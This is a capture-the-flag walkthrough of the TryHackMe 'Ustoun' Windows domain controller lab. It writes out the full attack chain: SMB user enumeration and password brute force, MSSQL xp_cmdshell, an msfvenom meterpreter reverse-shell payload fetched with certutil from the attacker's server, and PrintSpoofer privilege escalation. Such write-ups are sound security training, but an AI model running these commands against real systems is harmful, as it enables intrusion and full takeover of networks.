---
description: https://tryhackme.com/room/ustoun
---

# USTOUN

## Nmap

```
sudo nmap 10.10.82.202 -p- -sS -sV

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-24 07:30:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49795/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Starting off we try default LDAP nmap scripts with null credentials against the Domain Controller.

```bash
nmap -n -sV --script "ldap* and not brute" <IP>
```

This reveals the domain name of ustoun.local

![](<../../../.gitbook/assets/image (1813).png>)

I then checked `SMB` and was successful using anonymous login with `Crackmapexec`. Here I used the `--rid-brute` option and grepped for users accounts.

```bash
crackmapexec smb <IP> -u 'a' -p '' --users --rid-brute | grep '(SidTypeUser)'
```

![](<../../../.gitbook/assets/image (1814).png>)

Since we now have the user account `SVC-Kerb` I will attempt to brute force the login over `SMB` with `Crackmapexec`.

```bash
crackmapexec smb <IP> -u 'SVC-Kerb' -p /usr/share/wordlists/rockyou.txt | grep '[+]'
```

![](<../../../.gitbook/assets/image (1815).png>)

From here I was unable to execute commands through `SMB` or resolve any new information. I logged into SYSVOL and NETLOGON and was unable to find anything at all. `WinRM` was not accepting these credentials and `RDP` was not letting me in either.

I then tried `MSSQL` with Impacket's mssqlclient.py and was given access.

```bash
python mssqlclient.py -port 1433 svc-kerb:superman@<IP>
```

![](<../../../.gitbook/assets/image (1816).png>)

From here we can run `enable_xp_cmdshell` and then confirm command execution with `xp_cmdshell whoami`.

![](<../../../.gitbook/assets/image (1817).png>)

In order to gain a decent shell from here I next generated a `msfvenom` `metasploit` executable.

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4422 -f exe -o reverse.exe
```

Then hosted a Python SimpleHTTPServer on my attacking machine. I then used the `MSSQL` session to download the file with `certutil.exe` and copy to c:\windows\temp. I then used another command to run the reverse.exe and gain a `meterpreter` shell.

```bash
xp_cmdshell cmd.exe /c certutil.exe -f -urlcache -split http://<IP>/reverse.exe c:\windows\temp\reverse.exe
xp_cmdshell cmd.exe /c c:\windows\temp\reverse.exe
```

![](<../../../.gitbook/assets/image (1818).png>)

Dropping into Shell and checking our privileges shows we have the privilege `SeImpersonatePrivilege`.

![](<../../../.gitbook/assets/image (1819).png>)

This can be used to perform Juicy Potato attacks or PrintSpoofer attacks. Checking systeminfo we notice we are running Windows Server 2019.

![](<../../../.gitbook/assets/image (1820).png>)

As a result a successful Juicy Potato attack would be unlikely however, a Print Spoofer attack or CVE-2020-1048 would be more viable and likely: [https://nvd.nist.gov/vuln/detail/CVE-2020-1048](https://nvd.nist.gov/vuln/detail/CVE-2020-1048).

To perform this attack upload the following binary to the target system: [https://github.com/dievus/printspoofer](https://github.com/dievus/printspoofer).

![](<../../../.gitbook/assets/image (1821).png>)

Once uploaded run the following command to spawn a privileged shell.

```bash
PrintSpoofer.exe -i -c cmd
```

![](<../../../.gitbook/assets/image (1822).png>)

From here we are able to access the Administrator's Desktop and grab the root flag.

![](<../../../.gitbook/assets/image (1823).png>)
